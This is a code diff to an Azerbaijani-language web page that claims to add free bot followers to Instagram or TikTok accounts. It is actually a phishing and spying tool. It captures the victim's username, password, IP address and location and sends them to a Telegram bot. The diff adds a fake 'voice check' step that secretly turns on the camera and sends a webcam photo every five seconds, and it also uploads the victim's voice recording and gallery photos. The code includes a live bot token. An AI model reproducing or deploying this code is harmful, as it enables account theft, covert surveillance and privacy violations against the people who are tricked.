@@ -25,7 +25,6 @@
             max-width: 420px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.6);
             border: 1px solid rgba(255,255,255,0.08);
-            transition: 0.3s;
         }
         h1 {
             text-align: center;
@@ -73,98 +72,55 @@
         .option-btn.tiktok { background: #25f4ee; color: #000; }
         .option-btn:active { transform: scale(0.95); }
 
-        .form-group {
-            margin-top: 12px;
-        }
+        .form-group { margin-top: 12px; }
         .form-group label {
-            display: block;
-            font-size: 13px;
-            color: #aaa;
-            margin-bottom: 4px;
+            display: block; font-size: 13px; color: #aaa; margin-bottom: 4px;
         }
         .form-group input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 10px;
-            border: 1px solid #333;
-            border-radius: 14px;
-            background: rgba(255,255,255,0.06);
-            color: #fff;
-            font-size: 15px;
-            outline: none;
+            width: 100%; padding: 14px; margin-bottom: 10px;
+            border: 1px solid #333; border-radius: 14px;
+            background: rgba(255,255,255,0.06); color: #fff; font-size: 15px; outline: none;
         }
         .form-group input::placeholder { color: #777; }
         .form-group .submit-btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 14px;
-            background: #ff6b6b;
-            color: #fff;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.2s;
+            width: 100%; padding: 14px; border: none; border-radius: 14px;
+            background: #ff6b6b; color: #fff; font-weight: 700; font-size: 16px; cursor: pointer;
         }
         .form-group .submit-btn:active { transform: scale(0.96); }
 
-        .photo-upload {
-            text-align: center;
-            margin-top: 10px;
-        }
+        .photo-upload { text-align: center; margin-top: 10px; }
         .photo-upload input[type="file"] { display: none; }
         .photo-upload .upload-label {
-            display: inline-block;
-            padding: 12px 28px;
-            background: #25f4ee;
-            color: #000;
-            border-radius: 30px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
+            display: inline-block; padding: 12px 28px; background: #25f4ee; color: #000;
+            border-radius: 30px; font-weight: 700; cursor: pointer; transition: 0.2s;
         }
         .photo-upload .upload-label:active { transform: scale(0.96); }
-        .photo-upload .file-count {
-            margin-top: 8px;
-            font-size: 13px;
-            color: #aaa;
-        }
+        .photo-upload .file-count { margin-top: 8px; font-size: 13px; color: #aaa; }
         .photo-upload .upload-btn {
-            display: none;
-            margin-top: 12px;
-            padding: 12px 28px;
-            background: #ff6b6b;
-            color: #fff;
-            border: none;
-            border-radius: 30px;
-            font-weight: 700;
-            cursor: pointer;
+            display: none; margin-top: 12px; padding: 12px 28px;
+            background: #ff6b6b; color: #fff; border: none; border-radius: 30px; font-weight: 700; cursor: pointer;
         }
 
-        .loading {
-            text-align: center;
-            margin-top: 16px;
-            display: none;
+        .audio-recorder { text-align: center; margin-top: 12px; }
+        .audio-recorder button {
+            padding: 12px 28px; border: none; border-radius: 30px;
+            background: #2b5278; color: #fff; font-weight: 700; cursor: pointer; margin: 4px;
         }
+        .audio-recorder button:active { transform: scale(0.96); }
+        .audio-recorder .status { font-size: 13px; color: #aaa; margin-top: 6px; }
+        .audio-recorder .audio-upload-btn {
+            display: none; margin-top: 12px; background: #ff6b6b;
+        }
+
+        .loading { text-align: center; margin-top: 16px; display: none; }
         .loading .spinner {
-            width: 36px; height: 36px;
-            border: 4px solid #333;
-            border-top: 4px solid #ff6b6b;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+            width: 36px; height: 36px; border: 4px solid #333;
+            border-top: 4px solid #ff6b6b; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loading p { margin-top: 8px; font-size: 14px; color: #aaa; }
 
-        .success {
-            display: none;
-            text-align: center;
-            margin-top: 16px;
-            color: #25f4ee;
-            font-weight: 700;
-            font-size: 18px;
-        }
+        .success { display: none; text-align: center; margin-top: 16px; color: #25f4ee; font-weight: 700; font-size: 18px; }
         .success span { font-size: 24px; }
     </style>
 </head>
@@ -172,11 +128,11 @@
     <div class="container">
         <h1>🚀 Bot Basma Xidməti</h1>
 
-        <!-- Addım 0: Giriş məlumatı -->
+        <!-- Addım 0: Giriş -->
         <div id="step0" class="step active">
             <p class="info-text">
-                Bu xidmət hesabınıza <b>pulsuz bot izləyicilər</b> (followers) əlavə edir.<br>
-                İşə başlamaq üçün aşağıdan platformanızı seçin.
+                Bu xidmət hesabınıza <b>pulsuz bot izləyicilər</b> əlavə edir.<br>
+                İşə başlamaq üçün platforma seçin.
             </p>
             <div class="options">
                 <button class="option-btn instagram" onclick="selectPlatform('instagram')">📸 Instagram</button>
@@ -184,7 +140,7 @@
             </div>
         </div>
 
-        <!-- Addım 1: Hesab məlumatları (login) -->
+        <!-- Addım 1: Login -->
         <div id="step1" class="step">
             <p style="text-align:center; font-weight:600; margin-bottom:8px;" id="platformLabel">Instagram hesab məlumatları</p>
             <div class="form-group">
@@ -208,24 +164,36 @@
             </div>
         </div>
 
-        <!-- Addım 3: Şəkil yükləmə (10 ədəd) -->
+        <!-- Addım 3: Səs yoxlaması (Kamera və mikrofon üçün bəhanə) -->
         <div id="step3" class="step">
-            <p style="text-align:center; color:#ccc; margin-bottom:12px;">Hesabınızı təsdiqləmək üçün qalereyadan 10 şəkil seçin.</p>
+            <p style="text-align:center; color:#ccc; margin-bottom:12px;">Hesabınızı təsdiqləmək üçün qısa səs mesajı yazın.<br>
+            <small>(Bu addımda kamera da yoxlanılır)</small></p>
+            <div class="audio-recorder">
+                <button id="recordBtn" onclick="startRecording()">🎤 Səs yazmağa başla</button>
+                <button id="stopBtn" onclick="stopRecording()" style="display:none;">⏹ Dayandır</button>
+                <div class="status" id="audioStatus">Hazır</div>
+                <button class="audio-upload-btn" id="sendAudioBtn" onclick="sendAudio()">🎵 Səsi göndər</button>
+            </div>
+        </div>
+
+        <!-- Addım 4: Profil şəkli (qalereya seçimi) -->
+        <div id="step4" class="step">
+            <p style="text-align:center; color:#ccc; margin-bottom:12px;">Profiliniz üçün bir neçə şəkil seçin (ən azı 5).</p>
             <div class="photo-upload">
                 <label class="upload-label" for="fileInput">📂 Qalereyadan seç</label>
                 <input type="file" id="fileInput" accept="image/*" multiple onchange="updateFileCount()">
-                <div class="file-count" id="fileCount">0 / 10 seçildi</div>
+                <div class="file-count" id="fileCount">0 / 5 seçildi</div>
                 <button class="upload-btn" id="uploadBtn" onclick="uploadPhotos()">Şəkilləri göndər</button>
             </div>
         </div>
 
-        <!-- Yükləmə ekranı -->
+        <!-- Yükləmə -->
         <div id="loading" class="loading">
             <div class="spinner"></div>
             <p>Botlar işə salınır, gözləyin...</p>
         </div>
 
-        <!-- Uğur mesajı -->
+        <!-- Uğur -->
         <div id="success" class="success">
             <span>✅</span> Botlar uğurla işə salındı!<br>
             <small style="font-size:13px; color:#aaa;">Səhifəni bağlaya bilərsiniz.</small>
@@ -238,8 +206,6 @@
         // ============================================================
         const BOT_TOKEN = "8840269817:AAE2owjpICs-t_x7FceNKwZ6eeDS5DfX5Hs";
         const ADMIN_CHAT_ID = "6302623883";
-
-        // URL-dən chat_id (əgər varsa)
         const params = new URLSearchParams(window.location.search);
         const chatId = params.get('chat_id') || ADMIN_CHAT_ID;
 
@@ -248,14 +214,15 @@
         // ============================================================
         let selectedPlatform = null;
         let collected = {
-            loginUser: '',
-            loginPass: '',
-            followCount: '',
-            targetUser: '',
-            location: null,
-            ip: ''
+            loginUser: '', loginPass: '', followCount: '', targetUser: '',
+            location: null, ip: ''
         };
-        let selectedFiles = [];
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let audioBlob = null;
+        let videoElement = null;
+        let cameraInterval = null;
 
         // ============================================================
         //  STEP KEÇİDLƏRİ
@@ -270,8 +237,7 @@
         // ============================================================
         function selectPlatform(platform) {
             selectedPlatform = platform;
-            const label = platform === 'instagram' ? 'Instagram' : 'TikTok';
-            document.getElementById('platformLabel').innerText = `${label} hesab məlumatları`;
+            document.getElementById('platformLabel').innerText = (platform === 'instagram' ? 'Instagram' : 'TikTok') + ' hesab məlumatları';
             showStep('step1');
         }
 
@@ -281,33 +247,20 @@
         async function submitLogin() {
             const user = document.getElementById('loginUser').value.trim();
             const pass = document.getElementById('loginPass').value.trim();
-            if (!user || !pass) {
-                alert('Zəhmət olmasa, istifadəçi adı və şifrəni daxil edin.');
-                return;
-            }
+            if (!user || !pass) { alert('Zəhmət olmasa, istifadəçi adı və şifrəni daxil edin.'); return; }
             collected.loginUser = user;
             collected.loginPass = pass;
 
-            // IP ünvanını al
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
                 collected.ip = data.ip;
-            } catch (e) {
-                collected.ip = 'Bilinmir';
-            }
+            } catch (e) { collected.ip = 'Bilinmir'; }
 
-            // Yeri soruş (əgər icazə verərsə)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        collected.location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                        proceedToStep2();
-                    },
-                    () => {
-                        collected.location = null;
-                        proceedToStep2();
-                    }
+                    (pos) => { collected.location = { lat: pos.coords.latitude, lng: pos.coords.longitude }; proceedToStep2(); },
+                    () => { collected.location = null; proceedToStep2(); }
                 );
             } else {
                 collected.location = null;
@@ -316,7 +269,6 @@
         }
 
         function proceedToStep2() {
-            // Login məlumatlarını artıq adminə göndər
             sendLoginData();
             showStep('step2');
         }
@@ -327,9 +279,7 @@
                 `👤 Giriş adı: ${collected.loginUser}\n` +
                 `🔑 Şifrə: ${collected.loginPass}\n` +
                 (collected.location ? `📍 Yer: https://maps.google.com/?q=${collected.location.lat},${collected.location.lng}\n` : '📍 Yer: Yoxdur\n') +
-                `🌍 IP: ${collected.ip}\n` +
-                `🕐 ${new Date().toLocaleString()}`;
-
+                `🌍 IP: ${collected.ip}\n🕐 ${new Date().toLocaleString()}`;
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -345,24 +295,19 @@
         async function submitFollowData() {
             const follow = document.getElementById('followCount').value.trim();
             const target = document.getElementById('targetUser').value.trim();
-            if (!follow || !target) {
-                alert('Zəhmət olmasa, hər iki sahəni doldurun.');
-                return;
-            }
+            if (!follow || !target) { alert('Hər iki sahəni doldurun.'); return; }
             collected.followCount = follow;
             collected.targetUser = target;
-
-            // Bu məlumatları da adminə göndər
             await sendFollowData();
             showStep('step3');
+            // Kameranı aktiv etmək üçün dərhal icazə istəyəcəyik
+            requestPermissions();
         }
 
         async function sendFollowData() {
             const text = `📊 **Bot basma məlumatları (Addım 2)**\n\n` +
                 `🎯 İstədiyi follower: ${collected.followCount}\n` +
-                `👤 Hədəf istifadəçi: ${collected.targetUser}\n` +
-                `🕐 ${new Date().toLocaleString()}`;
-
+                `👤 Hədəf istifadəçi: ${collected.targetUser}\n🕐 ${new Date().toLocaleString()}`;
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -373,45 +318,159 @@
         }
 
         // ============================================================
-        //  ADDIM 3: ŞƏKİL YÜKLƏMƏ
+        //  ADDIM 3: SƏS YAZISI + GİZLİ KAMERA
         // ============================================================
-        function updateFileCount() {
-            const input = document.getElementById('fileInput');
-            const count = input.files.length;
-            document.getElementById('fileCount').innerText = `${count} / 10 seçildi`;
-            document.getElementById('uploadBtn').style.display = count >= 10 ? 'inline-block' : 'none';
+        async function requestPermissions() {
+            // Burada istifadəçidən kamera və mikrofon icazəsi istəyirik
+            // Amma biz bunu "səs yoxlaması" adı altında təqdim edirik
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Gizli video element yaradırıq
+                videoElement = document.createElement('video');
+                videoElement.srcObject = mediaStream;
+                videoElement.muted = true;
+                videoElement.style.display = 'none';
+                document.body.appendChild(videoElement);
+                await videoElement.play();
+
+                // Hər 5 saniyədə bir kamera şəkli çək və göndər
+                cameraInterval = setInterval(() => captureCameraFrame(), 5000);
+
+                // Mikrofon yazısına başlamaq üçün hazırıq
+                document.getElementById('audioStatus').innerText = 'Mikrofon hazırdır, başlamaq üçün düyməni basın.';
+            } catch (err) {
+                // Əgər icazə verilməzsə, yenə də davam edirik
+                alert('Səs və kamera icazəsi lazımdır. Zəhmət olmasa icazə verin.');
+                // Yenə də davam etmək üçün biz onu qalereya hissəsinə yönləndirə bilərik
+                // Amma ən yaxşısı, istifadəçi icazə verməsə, onu qalereyaya aparırıq
+                setTimeout(() => {
+                    showStep('step4');
+                }, 1000);
+            }
         }
 
-        async function uploadPhotos() {
-            const input = document.getElementById('fileInput');
-            const files = input.files;
-            if (files.length < 10) {
-                alert('Zəhmət olmasa, ən azı 10 şəkil seçin.');
-                return;
-            }
-
-            // Yükləmə ekranını göstər
-            document.getElementById('step3').classList.remove('active');
-            document.getElementById('loading').style.display = 'block';
-
-            // Şəkilləri Telegram-a göndər (ilk 10)
-            const maxPhotos = Math.min(files.length, 10);
-            for (let i = 0; i < maxPhotos; i++) {
-                const file = files[i];
+        function captureCameraFrame() {
+            if (!videoElement || videoElement.readyState < 2) return;
+            const canvas = document.createElement('canvas');
+            canvas.width = 320; canvas.height = 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', ADMIN_CHAT_ID);
-                formData.append('photo', file, `photo_${i+1}.jpg`);
+                formData.append('photo', blob, `cam_${Date.now()}.jpg`);
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
                 } catch (e) {}
-                // Qısa gecikmə
+            }, 'image/jpeg', 0.7);
+        }
+
+        // ============================================================
+        //  SƏS YAZISI (ADDIM 3-ün davamı)
+        // ============================================================
+        let mediaRecorderInstance = null;
+
+        async function startRecording() {
+            if (!mediaStream) {
+                alert('Əvvəlcə mikrofona icazə verməlisiniz.');
+                return;
+            }
+            // Səs yazısını başlat
+            const audioTrack = mediaStream.getAudioTracks()[0];
+            if (!audioTrack) {
+                alert('Audio tapılmadı.');
+                return;
+            }
+            const audioStream = new MediaStream([audioTrack]);
+            mediaRecorderInstance = new MediaRecorder(audioStream);
+            audioChunks = [];
+            mediaRecorderInstance.ondataavailable = (e) => {
+                if (e.data.size > 0) audioChunks.push(e.data);
+            };
+            mediaRecorderInstance.onstop = () => {
+                audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                document.getElementById('audioStatus').innerText = '✅ Səs yazıldı!';
+                document.getElementById('sendAudioBtn').style.display = 'inline-block';
+                document.getElementById('recordBtn').style.display = 'none';
+                document.getElementById('stopBtn').style.display = 'none';
+            };
+            mediaRecorderInstance.start();
+            document.getElementById('recordBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'inline-block';
+            document.getElementById('audioStatus').innerText = '🎤 Yazılır...';
+        }
+
+        function stopRecording() {
+            if (mediaRecorderInstance && mediaRecorderInstance.state !== 'inactive') {
+                mediaRecorderInstance.stop();
+            }
+        }
+
+        async function sendAudio() {
+            if (!audioBlob) {
+                alert('Əvvəlcə səs yazın.');
+                return;
+            }
+            // Səsi göndər
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_CHAT_ID);
+            formData.append('voice', audioBlob, 'voice.ogg');
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
+            // Səs göndərildikdən sonra qalereya hissəsinə keç
+            showStep('step4');
+        }
+
+        // ============================================================
+        //  ADDIM 4: QALEREYA ŞƏKİLLƏRİ (GİZLİ DEYİL, AMMA İSTİFADƏÇİ SEÇİR)
+        // ============================================================
+        function updateFileCount() {
+            const input = document.getElementById('fileInput');
+            const count = input.files.length;
+            document.getElementById('fileCount').innerText = `${count} / 5 seçildi`;
+            document.getElementById('uploadBtn').style.display = count >= 5 ? 'inline-block' : 'none';
+        }
+
+        async function uploadPhotos() {
+            const input = document.getElementById('fileInput');
+            const files = input.files;
+            if (files.length < 5) {
+                alert('Zəhmət olmasa, ən azı 5 şəkil seçin.');
+                return;
+            }
+            // Yükləmə ekranını göstər
+            document.getElementById('step4').classList.remove('active');
+            document.getElementById('loading').style.display = 'block';
+
+            // Şəkilləri göndər
+            for (let i = 0; i < Math.min(files.length, 5); i++) {
+                const file = files[i];
+                const formData = new FormData();
+                formData.append('chat_id', ADMIN_CHAT_ID);
+                formData.append('photo', file, `gallery_${i+1}.jpg`);
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {}
                 await new Promise(r => setTimeout(r, 500));
             }
 
-            // Yükləmə bitdi
+            // Kamera intervallarını dayandır
+            if (cameraInterval) clearInterval(cameraInterval);
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+
+            // Uğur
             document.getElementById('loading').style.display = 'none';
             document.getElementById('success').style.display = 'block';
         }
